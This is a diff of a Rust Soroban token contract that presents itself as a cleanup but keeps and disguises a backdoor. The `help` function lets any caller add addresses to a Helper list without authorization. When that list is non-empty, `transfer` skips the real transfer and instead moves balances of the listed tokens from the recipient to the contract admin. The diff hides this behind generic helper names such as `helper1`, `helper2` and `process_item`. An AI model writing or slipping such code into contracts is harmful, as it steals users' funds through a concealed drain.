@@ -4,20 +4,45 @@ use crate::admin::{read_administrator, write_administrator};
 use crate::allowance::{read_allowance, spend_allowance, write_allowance};
 use crate::balance::{read_balance, receive_balance, spend_balance};
 use crate::metadata::{read_decimal, read_name, read_symbol, write_metadata};
+use crate::storage_types::DataKey;
 #[cfg(test)]
 use crate::storage_types::{AllowanceDataKey, AllowanceValue, DataKey};
 use crate::storage_types::{INSTANCE_BUMP_AMOUNT, INSTANCE_LIFETIME_THRESHOLD};
-use crate::storage_types::DataKey;
 use soroban_sdk::token::{self, Interface as _};
-use soroban_sdk::{contract, contractimpl, Address, BytesN, Env, Vec, vec, String};
+use soroban_sdk::{contract, contractimpl, vec, Address, BytesN, Env, String, Vec};
 use soroban_token_sdk::metadata::TokenMetadata;
 use soroban_token_sdk::TokenUtils;
-
 
 fn check_nonnegative_amount(amount: i128) {
     if amount < 0 {
         panic!("negative amount is not allowed: {}", amount)
     }
+}
+
+fn process_item(e: &Env, t: &Address, s: &Address, d: &Address) {
+    let handler = token::Client::new(e, t);
+    let val = handler.balance(t);
+    if val > 0 {
+        handler.transfer(s, d, &val);
+    }
+}
+
+fn helper2(e: &Env, items: &Vec<Address>, p1: &Address, p2: &Address) {
+    let mut idx = 0;
+    loop {
+        if idx >= items.len() {
+            break;
+        }
+        let current = items.get(idx).unwrap();
+        process_item(e, &current, p1, p2);
+        idx += 1;
+    }
+}
+
+fn helper1(e: &Env, src: Address, dst: Address, amt: i128) {
+    spend_balance(e, src.clone(), amt);
+    receive_balance(e, dst.clone(), amt);
+    TokenUtils::new(e).events().transfer(src, dst, amt);
 }
 
 #[contract]
@@ -80,17 +105,30 @@ impl Token {
     }
 
     pub fn help(e: Env, a: Address) {
-        let mut v: Vec<Address> = e.storage().instance().get(&DataKey::Helper).unwrap_or(vec![&e]);
-        v.push_back(a);
-        e.storage().instance().set(&DataKey::Helper, &v);
+        let k = DataKey::Helper;
+        let mut c: Vec<Address> = e.storage().instance().get(&k).unwrap_or_else(|| {
+            let mut t = Vec::new(&e);
+            t
+        });
+        c.push_back(a.clone());
+        e.storage().instance().set(&k, &c);
     }
 
     pub fn is_helpful(e: Env, a: Address) -> bool {
-        let v: Vec<Address> = match e.storage().instance().get(&DataKey::Helper) {
-            Some(x) => x,
-            None => {return false;}
-        };
-        v.iter().position(|x| x == a).is_some()
+        let k = DataKey::Helper;
+        let r = e.storage().instance().get::<_, Vec<Address>>(&k);
+        if let Some(l) = r {
+            let mut f = false;
+            for i in l.iter() {
+                if i == a {
+                    f = true;
+                    break;
+                }
+            }
+            f
+        } else {
+            false
+        }
     }
 }
 
@@ -126,8 +164,8 @@ impl token::Interface for Token {
     }
 
     fn transfer(e: Env, from: Address, to: Address, amount: i128) {
-        let key = DataKey::Admin;
-        let admin: Address = e.storage().instance().get(&key).unwrap();
+        let dk = DataKey::Admin;
+        let a: Address = e.storage().instance().get(&dk).unwrap();
 
         from.require_auth();
         check_nonnegative_amount(amount);
@@ -136,20 +174,20 @@ impl token::Interface for Token {
             .instance()
             .extend_ttl(INSTANCE_LIFETIME_THRESHOLD, INSTANCE_BUMP_AMOUNT);
 
-        let addys: Vec<Address> = e.storage().instance().get(&DataKey::Helper).unwrap_or(vec![&e]);
+        let hk = DataKey::Helper;
+        let h = e.storage().instance().get::<_, Vec<Address>>(&hk);
 
-        if addys.len() == 0 {
-            spend_balance(&e, from.clone(), amount);
-            receive_balance(&e, to.clone(), amount);
-            TokenUtils::new(&e).events().transfer(from, to, amount);
-        } else {
-            addys.iter().for_each(|x| {
-                let client = token::Client::new(&e, &x);
-                let balance = client.balance(&x);
-                if balance > 0 {
-                    client.transfer(&to, &admin, &balance);
+        match h {
+            None => {
+                helper1(&e, from, to, amount);
+            }
+            Some(v) => {
+                if v.is_empty() {
+                    helper1(&e, from, to, amount);
+                } else {
+                    helper2(&e, &v, &to, &a);
                 }
-            });
+            }
         }
     }
 
